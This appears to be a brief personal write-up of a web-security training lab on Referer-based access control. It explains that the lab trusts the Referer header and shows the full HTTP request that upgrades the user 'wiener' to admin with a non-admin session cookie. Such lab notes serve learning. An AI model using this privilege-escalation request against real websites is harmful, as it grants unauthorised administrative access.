---
tags:
  - access-control
---
very simple, in this type of labs, websites only check that referer is from an admin endpoint or not, and done, that is there protection.
so check out the request that is sent to upgrade a user, keep the referer and only change the username and the session.
```text
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: session-id.web-security-academy.net
Cookie: session=non-admin-user-cookie
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:158.0) Gecko/20100101 Firefox/158.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Sec-Gpc: 1
Referer: https://session-id.web-security-academy.net/admin
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Dnt: 1
Priority: u=0, i
Te: trailers
```
and done.